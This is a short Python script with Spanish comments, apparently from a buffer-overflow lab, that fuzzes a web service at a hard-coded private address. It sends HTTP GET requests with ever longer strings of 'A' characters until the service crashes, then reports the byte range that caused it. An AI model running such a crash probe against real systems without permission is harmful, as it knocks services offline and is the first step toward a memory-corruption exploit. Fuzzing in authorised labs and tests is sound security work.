#!/usr/bin/python3

import socket
import sys
from struct import pack

# Verificamos si se proporciona algún argumento en la línea de comandos
if len(sys.argv) != 1:
    print("\n[!] Uso: ./Fuzzing_auto.py \n")
    exit(1)

# Definimos la dirección IP del objetivo, el puerto y la longitud total inicial
ip_address = "192.168.68.128"  # IP del objetivo   *******Cambiar esto*******
port = 80  # Puerto del objetivo *******Cambiar esto*******
total_length = 100  # Longitud total inicial

# Función para realizar el exploit
def exploit():
    global total_length  # Declarar total_length como global

    while True:
        try:
            # Creamos un socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Configuramos un tiempo de espera de 10 segundos
            s.settimeout(10)

            # Conectamos al objetivo
            s.connect((ip_address, port))

            #banner = s.recv(1024) # Comentado ya que daba problemas de ejecucion
          
            # Mostrar mensaje informativo
            print(f"\nEnviando {total_length}")

            # Enviamos una solicitud GET con una longitud específica
            s.send(b"GET " + b"A" * total_length + b" HTTP/1.1" + b"\r\n"*2)

            # Recibimos la respuesta
            response = s.recv(1024)

            # Cerramos la conexión
            s.close()

            # Incrementamos la longitud total para el próximo intento
            total_length += 100

        except:
            # Capturamos una excepción si la conexión falla
            print(f"\n[!] Servicio parado entre {total_length} y {total_length - 100} Bytes")
            sys.exit(1)

# Verificamos si el script se ejecuta como programa principal
if __name__ == '__main__':
    exploit()
